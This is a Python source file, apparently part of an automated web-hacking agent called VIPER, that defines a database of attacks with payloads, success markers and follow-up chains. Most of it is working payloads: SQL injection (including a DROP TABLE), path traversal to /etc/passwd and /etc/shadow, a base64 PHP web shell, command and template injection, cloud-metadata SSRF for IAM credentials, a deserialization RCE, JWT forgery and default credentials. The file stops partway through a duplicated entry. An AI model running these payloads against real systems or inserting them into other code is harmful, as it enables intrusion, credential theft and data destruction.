"""
VIPER Knowledge Base — Attack database and learned patterns.

Extracted from viper_core.py. Contains the Attack dataclass and
ViperKnowledge class used by the hunt pipeline.
"""

import json
import logging
import os
import re
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, field

logger = logging.getLogger("viper.viper_core")

HACKAGENT_DIR = Path(__file__).parent.parent
CORE_DIR = HACKAGENT_DIR / "core"
KNOWLEDGE_FILE = CORE_DIR / "viper_knowledge.json"


@dataclass
class Attack:
    """An attack with all its variants"""
    name: str
    category: str  # recon, injection, auth, file, misc
    payloads: List[str]
    indicators: List[str]  # When to try this attack
    success_markers: List[str]  # How to know it worked
    failure_markers: List[str]  # How to know it definitely failed
    followups: List[str]  # What to try next if this works

    # Learning stats
    attempts: int = 0
    successes: int = 0

    @property
    def success_rate(self) -> float:
        return self.successes / max(self.attempts, 1)

    @property
    def confidence(self) -> float:
        if self.attempts < 5:
            return 0.5
        return self.success_rate


class ViperKnowledge:
    """VIPER's learned knowledge base."""

    def __init__(self):
        self.attacks: Dict[str, Attack] = {}
        self.tech_signatures: Dict[str, List[str]] = {}
        self.successful_chains: List[List[str]] = []
        self.target_history: Dict[str, Dict] = {}

        self._init_attacks()
        self._load()

    def _init_attacks(self):
        """Initialize attack database"""
        attacks_data = [
            # === RECON ===
            Attack(
                name="robots_txt",
                category="recon",
                payloads=["/robots.txt"],
                indicators=["http", "://"],
                success_markers=["Disallow:", "Allow:", "User-agent"],
                failure_markers=["404", "Not Found"],
                followups=["dir_bruteforce"]
            ),
            Attack(
                name="git_exposure",
                category="recon",
                payloads=["/.git/HEAD", "/.git/config"],
                indicators=["http"],
                success_markers=["ref:", "[core]", "[remote"],
                failure_markers=["404", "Not Found"],
                followups=["git_dump"]
            ),
            Attack(
                name="env_file",
                category="recon",
                payloads=["/.env", "/.env.local", "/.env.production"],
                indicators=["http"],
                success_markers=["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN"],
                failure_markers=["404", "<!DOCTYPE"],
                followups=["credential_use"]
            ),
            Attack(
                name="backup_files",
                category="recon",
                payloads=["/index.php.bak", "/index.php~", "/index.php.old", "/.index.php.swp"],
                indicators=["php"],
                success_markers=["<?php", "<?="],
                failure_markers=["404"],
                followups=["source_analysis"]
            ),
            Attack(
                name="dir_listing",
                category="recon",
                payloads=["/uploads/", "/backup/", "/admin/", "/files/", "/images/"],
                indicators=["http"],
                success_markers=["Index of", "Parent Directory", "<dir>"],
                failure_markers=["403", "404", "Forbidden"],
                followups=["file_enum"]
            ),

            # === INJECTION ===
            Attack(
                name="sqli_error",
                category="injection",
                payloads=[
                    # Classic error-based
                    "'", "\"", "')", "\"))", "''", "' OR '1'='1",
                    "\" OR \"1\"=\"1", "1' AND '1'='1", "1 AND 1=1",
                    "' OR 1=1--", "' OR 'x'='x", "') OR ('1'='1",
                    "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
                    # Boolean blind
                    "' AND 1=1--", "' AND 1=2--", "' OR 1=1#", "admin'--",
                    "' AND 'a'='a", "' AND 'a'='b",
                    # Time-based blind
                    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
                    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' OR SLEEP(5)#", "'; SELECT pg_sleep(5)--",
                    "1; WAITFOR DELAY '0:0:5'--",
                    # Stacked queries
                    "'; DROP TABLE test--", "'; SELECT 1--",
                    # WAF bypass
                    "/*!50000UNION*/", "%27", "%2527", "' AnD 1=1--",
                    "' /*!50000OR*/ '1'='1", "' uni%6fn sel%65ct 1--",
                    "' %55NION %53ELECT 1--", "' AND/**/1=1--",
                    # Database-specific
                    "' AND @@version--", "' AND version()--",
                    "' AND sqlite_version()--", "' AND banner FROM v$version--",
                    # Numeric injection
                    "1 OR 1=1", "1) OR (1=1", "-1 OR 1=1",
                    "1; SELECT 1", "1 HAVING 1=1",
                ],
                indicators=["=", "id", "user", "name", "search", "query", "select", "item", "cat", "page", "view"],
                success_markers=[
                    r"SQL[\s\S]{0,40}syntax", r"mysql[\s_]", r"ORA-\d{4,5}",
                    r"PostgreSQL.*ERROR", r"sqlite3?\.", r"ODBC.*Driver",
                    r"Microsoft.*SQL.*Server", r"Unclosed quotation mark",
                    r"pg_query\(\)", r"supplied argument is not a valid MySQL",
                    r"You have an error in your SQL", r"Warning.*mysql_",
                    r"MySqlClient\.", r"com\.mysql\.jdbc",
                    r"org\.postgresql\.util\.PSQLException",
                    r"Dynamic SQL Error", r"Sybase message",
                    r"valid MySQL result", r"Syntax error.*in query expression",
                ],
                failure_markers=[],
                followups=["sqli_union", "sqli_blind"]
            ),
            Attack(
                name="sqli_union",
                category="injection",
                payloads=[
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,2,3,4,5--",
                    "' UNION ALL SELECT NULL,NULL,@@version--",
                    "' UNION ALL SELECT NULL,NULL,version()--",
                    "' UNION SELECT username,password FROM users--",
                    "1 UNION SELECT username,password FROM users--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                    "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--",
                    "' UNION SELECT NULL,NULL,NULL FROM dual--",
                    "') UNION SELECT NULL,NULL--",
                    "')) UNION SELECT NULL,NULL--",
                    "' UNION SELECT 1,CONCAT(user(),database())--",
                    # WAF bypass union
                    "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
                    "' %55nion %53elect NULL--",
                    "' uNiOn sElEcT NULL--",
                    "' UNION ALL SELECT NULL-- -",
                ],
                indicators=["sqli_error"],
                success_markers=[
                    r"admin", r"password", r"username",
                    r"root@", r"information_schema",
                    r"\d+\.\d+\.\d+", r"@@version",
                ],
                failure_markers=["blocked", "WAF", "forbidden"],
                followups=["sqli_dump"]
            ),
            Attack(
                name="sqli_blind",
                category="injection",
                payloads=[
                    "' AND SUBSTRING(version(),1,1)='5'--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
                    "' AND (SELECT LENGTH(database()))>0--",
                    "' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--",
                    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "1 AND 1=1", "1 AND 1=2",
                ],
                indicators=["sqli_error"],
                success_markers=[r"different.*response", r"true.*condition"],
                failure_markers=["blocked", "WAF"],
                followups=["sqli_dump"]
            ),
            Attack(
                name="lfi_basic",
                category="injection",
                payloads=[
                    "/etc/passwd", "../etc/passwd",
                    "../../etc/passwd", "../../../etc/passwd",
                    "../../../../etc/passwd", "../../../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "..\\..\\..\\..\\etc\\passwd",
                    "/etc/passwd%00", "....//....//etc/passwd%00",
                    "..\\..\\..\\windows\\win.ini%00",
                    "%252e%252e%252fetc/passwd",
                    "..%252f..%252f..%252fetc/passwd",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%c0%af..%c0%afetc/passwd",
                    "..%ef%bc%8f..%ef%bc%8fetc/passwd",
                    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
                    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
                    "/var/log/httpd/access_log", "/var/log/auth.log",
                    "/proc/self/environ", "/proc/self/fd/0", "/proc/self/cmdline",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "C:\\Windows\\win.ini", "C:\\boot.ini",
                    "....\\\\....\\\\windows\\win.ini",
                    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/etc/shadow", "/etc/hosts", "/etc/hostname",
                    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
                    "/etc/mysql/my.cnf", "../../../../../../etc/passwd",
                ],
                indicators=["file", "path", "page", "include", "doc", "template", "load", "lang", "dir", "view"],
                success_markers=[
                    r"root:x?:\d+:\d+", r"/bin/(?:ba)?sh", r"\[extensions\]",
                    r"\[fonts\]", r"root:.*:0:0", r"daemon:.*:",
                    r"\[boot loader\]", r"DocumentRoot", r"server_name",
                ],
                failure_markers=["No such file", "failed to open", "not found"],
                followups=["lfi_wrapper", "log_poison"]
            ),
            Attack(
                name="lfi_wrapper",
                category="injection",
                payloads=[
                    "php://filter/convert.base64-encode/resource=index",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "php://filter/convert.base64-encode/resource=config",
                    "php://filter/convert.base64-encode/resource=../config",
                    "php://filter/read=string.rot13/resource=index.php",
                    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
                    "php://input",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                    "expect://id",
                    "expect://whoami",
                    "phar://test.phar",
                    "zip://uploads/avatar.zip#shell.php",
                ],
                indicators=["php", "lfi_basic"],
                success_markers=[r"PD9", r"cm9vd", r"base64", r"<\?php", r"phpinfo"],
                failure_markers=["allow_url_include", "not supported"],
                followups=["rce"]
            ),
            Attack(
                name="cmdi_basic",
                category="injection",
                payloads=[
                    ";id", "|id", "||id", "&&id", "`id`", "$(id)",
                    "& id", "\nid", ";ls", "|ls",
                    "; sleep 5", "| sleep 5", "& sleep 5",
                    "|| sleep 5", "&& sleep 5",
                    "& ping -c 5 127.0.0.1 &",
                    "; ping -c 5 127.0.0.1",
                    "| ping -c 5 127.0.0.1",
                    "& whoami", "| dir", "& dir",
                    "& ping -n 5 127.0.0.1", "| type C:\\windows\\win.ini",
                    "& net user", "| systeminfo",
                    "${IFS}id", "i\\d", ";{id}",
                    "$IFS/etc/passwd", ";cat${IFS}/etc/passwd",
                    "%0aid", "%0a%0did",
                    "$(whoami)", "`whoami`", "$({cat,/etc/passwd})",
                    "$(cat</etc/passwd)",
                    "%0a id", "%0d%0a id", "%09id",
                ],
                indicators=["cmd", "exec", "ping", "host", "ip", "system", "run", "command", "shell"],
                success_markers=[
                    r"uid=\d+", r"gid=\d+", r"groups=",
                    r"root:x:", r"www-data",
                    r"Directory of", r"Volume Serial",
                    r"\w+\\\w+", r"NT AUTHORITY",
                    r"total \d+", r"drwx",
                ],
                failure_markers=["not found", "invalid command"],
                followups=["reverse_shell"]
            ),
            Attack(
                name="ssti_basic",
                category="injection",
                payloads=[
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{7*7}", "#{7*7}",
                    "{{7*\'7\'}}", "${{7*7}}",
                    "{{config}}", "{{config.items()}}",
                    "{{self.__init__.__globals__}}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__}}",
                    "{{lipsum.__globals__[\'os\'].popen(\'id\').read()}}",
                    "{% for x in ().__class__.__base__.__subclasses__() %}{{x.__name__}}{% endfor %}",
                    "{%import os%}{{os.popen(\'id\').read()}}",
                    "#set($x = 7 * 7)$x",
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                    "<%= 7*7 %>", "<%= system(\"id\") %>",
                    "<%= `id` %>",
                    "${7*7}", "#{7*7}",
                    "T(java.lang.Runtime).getRuntime().exec(\'id\')",
                    "${T(java.lang.System).getenv()}",
                    "{php}echo `id`;{/php}", "{system(\'id\')}",
                    "${__import__(\'os\').popen(\'id\').read()}",
                ],
                indicators=["template", "render", "name", "message", "content", "preview", "bio", "comment"],
                success_markers=[
                    r"(?<!\{)49(?!\})",
                    r"uid=\d+", r"gid=\d+",
                    r"<class \'", r"__class__",
                    r"SECRET_KEY", r"DEBUG",
                    r"root:x:", r"www-data",
                    r"freemarker\.", r"java\.lang",
                ],
                failure_markers=[r"\{\{7\*7\}\}", r"\$\{7\*7\}"],
                followups=["ssti_rce"]
            ),
            Attack(
                name="xss_reflected",
                category="injection",
                payloads=[
                    "<script>alert(1)</script>",
                    "'\"><script>alert(1)</script>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<marquee onstart=alert(1)>",
                    "<video src=x onerror=alert(1)>",
                    "<audio src=x onerror=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<iframe onload=alert(1)>",
                    "\" onmouseover=\"alert(1)",
                    "' onfocus='alert(1)' autofocus='",
                    "\" autofocus onfocus=\"alert(1)",
                    "' onclick='alert(1)'",
                    "javascript:alert(1)",
                    "data:text/html,<script>alert(1)</script>",
                    "javascript:alert(document.domain)",
                    "<scr<script>ipt>alert(1)</script>",
                    "<SCRIPT>alert(1)</SCRIPT>",
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<script>alert`1`</script>",
                    "<script>alert(1)//",
                    "<img src=x onerror=alert`1`>",
                    "%3Cscript%3Ealert(1)%3C/script%3E",
                    "&#60;script&#62;alert(1)&#60;/script&#62;",
                    "${alert(1)}",
                    "{{constructor.constructor('return this')()}}",
                    "'\"><img src=x onerror=alert(1)//",
                ],
                indicators=["search", "q", "query", "name", "message", "error", "redirect", "url", "ref", "callback"],
                success_markers=[
                    r"<script>alert\(1\)</script>",
                    r"onerror\s*=\s*alert",
                    r"onload\s*=\s*alert",
                    r"onfocus\s*=\s*alert",
                    r"onmouseover\s*=\s*alert",
                    r"onclick\s*=\s*alert",
                    r"ontoggle\s*=\s*alert",
                    r"javascript:alert",
                    r"<svg[^>]*onload",
                    r"<img[^>]*onerror",
                ],
                failure_markers=[r"&lt;script", "blocked", "rejected"],
                followups=["xss_stored"]
            ),

            # === AUTH ===
            Attack(
                name="auth_bypass_cookie",
                category="auth",
                payloads=["admin=1", "loggedin=1", "authenticated=true", "role=admin"],
                indicators=["login", "auth", "session", "admin"],
                success_markers=["welcome", "dashboard", "admin", "logout"],
                failure_markers=["denied", "unauthorized", "login"],
                followups=["priv_esc"]
            ),
            Attack(
                name="auth_bypass_header",
                category="auth",
                payloads=[
                    "X-Forwarded-For: 127.0.0.1",
                    "X-Real-IP: 127.0.0.1",
                    "X-Original-URL: /admin"
                ],
                indicators=["admin", "internal", "localhost"],
                success_markers=["admin", "dashboard", "config"],
                failure_markers=["forbidden", "denied"],
                followups=["priv_esc"]
            ),
            Attack(
                name="default_creds",
                category="auth",
                payloads=[
                    "admin:admin", "admin:password", "admin:123456",
                    "root:root", "test:test", "guest:guest"
                ],
                indicators=["login", "username", "password"],
                success_markers=["welcome", "dashboard", "success"],
                failure_markers=["invalid", "incorrect", "failed"],
                followups=["post_auth_enum"]
            ),

            # === FILE ===
            Attack(
                name="webdav_put",
                category="file",
                payloads=["PUT /dav/test.txt", "PUT /uploads/test.txt"],
                indicators=["dav", "webdav", "DAV"],
                success_markers=["201", "204", "Created"],
                failure_markers=["405", "403", "Method Not Allowed"],
                followups=["webshell_upload"]
            ),
            Attack(
                name="file_upload",
                category="file",
                payloads=["shell.php", "shell.php.jpg", "shell.phtml", ".htaccess"],
                indicators=["upload", "file", "attach", "image"],
                success_markers=["uploaded", "success"],
                failure_markers=["invalid", "not allowed", "blocked"],
                followups=["webshell_exec"]
            ),

            # === NEW ATTACK TYPES (v2.3) ===

            Attack(
                name="jwt_none_alg",
                category="auth",
                payloads=[
                    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                    "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
                ],
                indicators=["jwt", "token", "bearer", "authorization", "auth"],
                success_markers=["admin", "dashboard", "welcome", "role.*admin", "authenticated"],
                failure_markers=["invalid token", "unauthorized", "expired", "signature"],
                followups=["idor_enum"]
            ),
            Attack(
                name="jwt_weak_secret",
                category="auth",
                payloads=[
                    "secret", "password", "123456", "key", "jwt_secret",
                    "changeme", "test", "admin", "your-256-bit-secret",
                ],
                indicators=["jwt", "token", "bearer", "authorization"],
                success_markers=["admin", "dashboard", "role", "authenticated"],
                failure_markers=["invalid", "unauthorized", "signature"],
                followups=["jwt_none_alg"]
            ),
            Attack(
                name="idor_enum",
                category="auth",
                payloads=[
                    "1", "2", "3", "100", "1000", "0", "-1",
                    "admin", "test", "user",
                    "../1", "../admin",
                ],
                indicators=["id", "user_id", "uid", "account", "profile", "order", "doc", "invoice", "file_id", "msg"],
                success_markers=[
                    r"\"name\"", r"\"email\"", r"\"user\"", r"\"username\"",
                    r"\"phone\"", r"\"address\"", r"\"order\"",
                    r"profile", r"account",
                ],
                failure_markers=["not found", "unauthorized", "forbidden", "no access"],
                followups=["idor_enum"]
            ),
            Attack(
                name="debug_endpoints",
                category="recon",
                payloads=[
                    "/debug", "/debug/vars", "/debug/pprof/",
                    "/_debug", "/server-status", "/server-info",
                    "/elmah.axd", "/trace.axd",
                    "/actuator", "/actuator/env", "/actuator/health",
                    "/actuator/mappings", "/actuator/configprops",
                    "/actuator/beans", "/actuator/heapdump",
                    "/console", "/admin/console",
                    "/__debug__/", "/phpinfo.php",
                    "/info", "/health", "/metrics",
                    "/swagger.json", "/swagger-ui.html",
                    "/api-docs", "/v2/api-docs", "/v3/api-docs",
                    "/_profiler/", "/silk/",
                    "/graphiql", "/altair",
                ],
                indicators=["http"],
                success_markers=[
                    r"phpinfo\(\)", r"PHP Version", r"System.*Linux",
                    r"DOCUMENT_ROOT", r"SERVER_SOFTWARE",
                    r"\"status\".*\"UP\"", r"\"health\"",
                    r"server-status", r"Apache Server",
                    r"pprof", r"goroutine", r"heap",
                    r"swagger", r"openapi", r"\"paths\"",
                    r"actuator", r"configprops", r"beans",
                    r"debug.*vars", r"memstats",
                    r"graphiql", r"GraphQL",
                    # Generic debug info markers
                    r"secret_key", r"api_key", r"database.*://",
                    r"\"debug\".*true", r"\"environment\"",
                    r"stack.trace", r"Traceback",
                ],
                failure_markers=["404", "Not Found", "403"],
                followups=["env_file", "source_maps"]
            ),
            Attack(
                name="source_maps",
                category="recon",
                payloads=[
                    "/main.js.map", "/app.js.map", "/bundle.js.map",
                    "/vendor.js.map", "/runtime.js.map", "/chunk.js.map",
                    "/static/js/main.js.map", "/static/js/bundle.js.map",
                    "/assets/index.js.map", "/dist/main.js.map",
                    "/build/static/js/main.chunk.js.map",
                    "/webpack.config.js", "/.webpack/",
                ],
                indicators=["http", "js", "react", "angular", "vue", "webpack"],
                success_markers=[
                    r"\"version\"\s*:\s*3", r"\"sources\"", r"\"mappings\"",
                    r"\"sourcesContent\"", r"\"file\"",
                    r"webpack://", r"module\.exports",
                ],
                failure_markers=["404", "Not Found"],
                followups=["env_file"]
            ),
            Attack(
                name="graphql_introspection",
                category="recon",
                payloads=[
                    '{"query":"{ __schema { types { name fields { name } } } }"}',
                    '{"query":"{ __schema { queryType { name } mutationType { name } } }"}',
                    '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
                    '{"query":"query IntrospectionQuery { __schema { types { name kind description fields(includeDeprecated: true) { name } } } }"}',
                ],
                indicators=["graphql", "gql", "query", "mutation", "api"],
                success_markers=[
                    r"__schema", r"__type", r"\"types\"",
                    r"\"queryType\"", r"\"mutationType\"",
                    r"\"fields\"", r"\"name\".*\"kind\"",
                ],
                failure_markers=["introspection.*disabled", "not allowed", "forbidden"],
                followups=["graphql_injection"]
            ),
            Attack(
                name="graphql_injection",
                category="injection",
                payloads=[
                    '{"query":"{ users { id email password } }"}',
                    '{"query":"mutation { register(email:\\"test@test.com\\", password:\\"test\\") { token } }"}',
                    '{"query":"{ user(id: 1) { email password apiKey } }"}',
                    '{"query":"query { search(term: \\"\\\\\\") { id } }"}',
                ],
                indicators=["graphql", "gql", "query", "graphql_introspection"],
                success_markers=[
                    r"\"password\"", r"\"email\"", r"\"token\"",
                    r"\"apiKey\"", r"\"secret\"",
                    r"syntax error", r"Cannot query field",
                ],
                failure_markers=["forbidden", "unauthorized"],
                followups=["sqli_error"]
            ),
            Attack(
                name="xxe_basic",
                category="injection",
                payloads=[
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                ],
                indicators=["xml", "soap", "feed", "rss", "svg", "upload", "import"],
                success_markers=[
                    r"root:x?:\d+:\d+", r"/bin/(?:ba)?sh",
                    r"\[extensions\]", r"\[fonts\]",
                    r"ami-id", r"instance-id",
                ],
                failure_markers=["parsing error", "not well-formed", "entities.*not allowed"],
                followups=["ssrf_basic", "lfi_basic"]
            ),
            Attack(
                name="crlf_injection",
                category="injection",
                payloads=[
                    "%0d%0aSet-Cookie:viper=crlf",
                    "%0d%0aX-Injected:viper-crlf-test",
                    "%0d%0a%0d%0a<script>alert(1)</script>",
                    "%E5%98%8A%E5%98%8DSet-Cookie:viper=crlf",
                    "%0d%0aLocation:https://evil.com",
                    "%0aX-Injected:viper",
                    "%0dX-Injected:viper",
                ],
                indicators=["redirect", "url", "next", "return", "goto", "callback", "header"],
                success_markers=[
                    r"Set-Cookie.*viper=crlf",
                    r"X-Injected.*viper",
                    r"viper-crlf-test",
                ],
                failure_markers=["blocked", "invalid"],
                followups=["xss_reflected", "open_redirect_basic"]
            ),
            Attack(
                name="host_header_injection",
                category="injection",
                payloads=[
                    "evil.com", "evil.com:80", "evil.com%00original.com",
                    "localhost", "127.0.0.1",
                ],
                indicators=["http", "host", "password", "reset", "forgot", "email"],
                success_markers=[
                    r"evil\.com", r"localhost.*reset",
                    r"127\.0\.0\.1.*link", r"password.*reset.*evil",
                    r"<a[^>]*evil\.com",
                ],
                failure_markers=["invalid host", "not recognized"],
                followups=["open_redirect_basic"]
            ),
            Attack(
                name="subdomain_takeover",
                category="recon",
                payloads=[
                    "NXDOMAIN", "NoSuchBucket",
                    "There isn't a GitHub Pages site here",
                    "herokucdn.com", "herokuapp.com",
                    "The specified bucket does not exist",
                    "Repository not found", "No such app",
                    "PROJECT_NOT_FOUND",
                    "Fastly error: unknown domain",
                    "Help Center Closed",
                ],
                indicators=["http", "subdomain", "cname"],
                success_markers=[
                    r"NoSuchBucket", r"NXDOMAIN",
                    r"There isn't a GitHub Pages",
                    r"No such app", r"unknown domain",
                    r"The specified bucket does not exist",
                ],
                failure_markers=["200 OK"],
                followups=[]
            ),
            Attack(
                name="verb_tampering",
                category="auth",
                payloads=["PATCH", "DELETE", "PUT", "TRACE", "OPTIONS", "CONNECT", "PROPFIND"],
                indicators=["admin", "api", "rest", "delete", "update", "edit"],
                success_markers=[
                    r"admin", r"dashboard", r"deleted", r"updated",
                    r"TRACE.*HTTP",
                    r"Allow:.*PUT", r"Allow:.*DELETE",
                ],
                failure_markers=["Method Not Allowed", "405", "403"],
                followups=["auth_bypass_header"]
            ),
            Attack(
                name="open_redirect_basic",
                category="injection",
                payloads=[
                    "https://evil.com", "//evil.com", "/\\evil.com",
                    "https://evil.com%00.target.com",
                    "https://evil.com?.target.com",
                    "https://evil.com@target.com",
                    "////evil.com", "https:evil.com",
                    "//evil%E3%80%82com",
                ],
                indicators=["redirect", "url", "next", "return", "goto", "continue", "dest", "redir", "callback", "forward"],
                success_markers=[
                    r"Location.*evil\.com",
                    r"window\.location.*evil",
                    r"meta.*refresh.*evil",
                ],
                failure_markers=["blocked", "invalid url", "not allowed"],
                followups=["xss_reflected"]
            ),
            Attack(
                name="cors_check",
                category="misc",
                payloads=[
                    "Origin: https://evil.com",
                    "Origin: null",
                    "Origin: https://target.com.evil.com",
                ],
                indicators=["http", "api", "json", "rest"],
                success_markers=[
                    r"Access-Control-Allow-Origin.*evil",
                    r"Access-Control-Allow-Origin.*null",
                    r"Access-Control-Allow-Credentials.*true",
                ],
                failure_markers=[],
                followups=[]
            ),
            Attack(
                name="cache_poisoning",
                category="injection",
                payloads=[
                    "X-Forwarded-Host: evil.com",
                    "X-Forwarded-Scheme: nothttps",
                    "X-Original-URL: /admin",
                    "X-Rewrite-URL: /admin",
                    "X-Host: evil.com",
                ],
                indicators=["http", "cdn", "cache", "cloudflare", "akamai", "fastly", "varnish"],
                success_markers=[
                    r"evil\.com", r"/admin",
                    r"X-Cache.*HIT", r"Age:\s*\d+",
                ],
                failure_markers=["blocked", "forbidden"],
                followups=["xss_reflected"]
            ),
            Attack(
                name="prototype_pollution",
                category="injection",
                payloads=[
                    "__proto__[polluted]=true",
                    "constructor[prototype][polluted]=true",
                    "__proto__.polluted=true",
                    '{"__proto__":{"polluted":"true"}}',
                    "__proto__[isAdmin]=true",
                ],
                indicators=["json", "merge", "extend", "assign", "node", "express", "javascript"],
                success_markers=[
                    r"polluted.*true", r"isAdmin.*true",
                    r"\"polluted\"", r"prototype",
                ],
                failure_markers=["invalid", "blocked"],
                followups=["xss_reflected"]
            ),
            Attack(
                name="insecure_deserialization",
                category="injection",
                payloads=[
                    "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcg==",
                    'O:8:"stdClass":1:{s:4:"test";s:5:"viper";}',
                    'a:1:{s:4:"test";s:5:"viper";}',
                    "gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
                    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
                ],
                indicators=["serialize", "object", "viewstate", "pickle", "marshal", "java", "base64", "cookie"],
                success_markers=[
                    r"uid=\d+", r"root:", r"www-data",
                    r"ClassNotFoundException", r"java\.io",
                    r"unserialize", r"__wakeup",
                    r"unpickle", r"pickle",
                ],
                failure_markers=["invalid", "blocked", "deserialization.*error"],
                followups=["cmdi_basic"]
            ),
            Attack(
                name="ssrf_basic",
                category="injection",
                payloads=[
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://100.100.100.200/latest/meta-data/",
                    "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
                    "http://127.0.0.1:6379/", "http://127.0.0.1:27017/",
                    "http://localhost:8080/", "http://localhost:9200/",
                    "http://[::1]/", "http://0x7f000001/",
                    "file:///etc/passwd", "file:///etc/hostname",
                    "gopher://127.0.0.1:6379/_INFO",
                    "dict://127.0.0.1:6379/info",
                ],
                indicators=["url", "uri", "src", "href", "fetch", "load", "proxy", "forward", "request", "link", "webhook"],
                success_markers=[
                    r"ami-id", r"instance-id", r"security-credentials",
                    r"computeMetadata", r"access_token",
                    r"root:x?:\d+:\d+", r"SSH-\d+",
                    r"redis_version", r"MongoDB",
                    r"elasticsearch",
                ],
                failure_markers=["blocked", "not allowed", "invalid url", "SSRF"],
                followups=["lfi_basic"]
            ),
            Attack(
                name="request_smuggling",
                category="injection",
                payloads=[
                    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
                    "Content-Length: 0\r\nTransfer-Encoding: chunked",
                    "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
                ],
                indicators=["http", "proxy", "cdn", "load balancer", "nginx", "haproxy"],
                success_markers=[
                    r"admin", r"smuggled",
                    r"two responses", r"desync",
                ],
                failure_markers=["400 Bad Request", "blocked"],
                followups=["auth_bypass_header"]
            ),

            # === MISSING ATTACK TYPES (v6.0) ===

            Attack(
                name="clickjacking",
                category="misc",
                payloads=["GET /"],
                indicators=["http", "html"],
                success_markers=["CLICKJACKING"],  # Set by handler when headers missing
                failure_markers=["X-Frame-Options", "frame-ancestors"],
                followups=[]
            ),
            Attack(
                name="csrf_token_leak",
                category="auth",
                payloads=[
                    "GET /", "GET /login", "GET /account", "GET /profile",
                    "GET /settings", "GET /api/user",
                ],
                indicators=["form", "login", "post", "submit"],
                success_markers=[
                    r"csrf", r"_token", r"authenticity_token", r"__RequestVerificationToken",
                    r"csrfmiddlewaretoken", r"X-CSRF-Token",
                ],
                failure_markers=[],
                followups=["csrf_bypass"]
            ),
            Attack(
                name="request_smuggling",
                category="injection",
                payloads=[
                    "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target}\r\n\r\n",
                    "POST / HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
                ],
                indicators=["http", "proxy", "reverse_proxy", "haproxy", "nginx", "cloudflare"],
